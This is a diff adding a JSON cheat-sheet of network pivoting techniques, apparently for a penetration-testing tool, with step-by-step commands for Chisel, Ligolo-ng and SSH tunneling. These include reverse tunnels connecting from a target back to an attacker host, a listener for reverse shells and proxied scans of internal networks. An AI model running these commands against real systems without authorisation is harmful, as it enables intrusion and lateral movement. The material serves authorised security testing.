@@ -1,0 +1,40 @@
+{
+  "chisel": {
+    "title": "Chisel - Network Pivoting & SOCKS5",
+    "category": "Pivoting & Tunneling",
+    "desc": "Fast TCP/UDP tunnel over HTTP secured via SSH.",
+    "steps": [
+      ["Start reverse server on attacker", "./chisel server -p 8000 --reverse"],
+      ["Connect client from target", "./chisel client <IP>:8000 R:socks"],
+      ["Configure proxychains", "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"],
+      ["Execute through tunnel", "proxychains nmap -sT -Pn -p 80,445 10.10.10.2"]
+    ]
+  },
+  "ligolo_ng": {
+    "title": "Ligolo-ng - Advanced Tunneling",
+    "category": "Pivoting & Tunneling",
+    "desc": "Create a tun interface for transparent network pivoting.",
+    "steps": [
+      ["Start proxy server on attacker", "./proxy -selfcert -laddr 0.0.0.0:11601"],
+      ["Upload and run agent on target", "./agent -connect <ATTACKER_IP>:11601 -ignore-cert"],
+      ["Add tun interface", "sudo ip tuntap add user $USER mode tun ligolo"],
+      ["Enable tun interface", "sudo ip link set ligolo up"],
+      ["Start tunnel in proxy console", "session -> select session -> tunnel_start"],
+      ["Add route to internal network", "sudo ip route add 192.168.100.0/24 dev ligolo"],
+      ["Expose listener for reverse shells", "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444"]
+    ]
+  },
+  "ssh_tunneling": {
+    "title": "SSH Port Forwarding & Tunneling",
+    "category": "Pivoting & Tunneling",
+    "desc": "Forward ports and create SOCKS proxies over SSH.",
+    "steps": [
+      ["Local port forward", "ssh -L <LOCAL_PORT>:<INTERNAL_IP>:<REMOTE_PORT> user@<IP>"],
+      ["Remote port forward", "ssh -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> user@<IP>"],
+      ["Dynamic SOCKS5 proxy", "ssh -D 1080 -q -C -N user@<IP>"],
+      ["Proxychains over SOCKS5 SSH", "proxychains nmap -sT -Pn <INTERNAL_IP>"],
+      ["Jump host forwarding", "ssh -J user@<JUMP_IP> user@<TARGET_IP>"],
+      ["Tunnel via sshuttle", "sshuttle -r user@<IP> 10.10.10.0/24"]
+    ]
+  }
+}
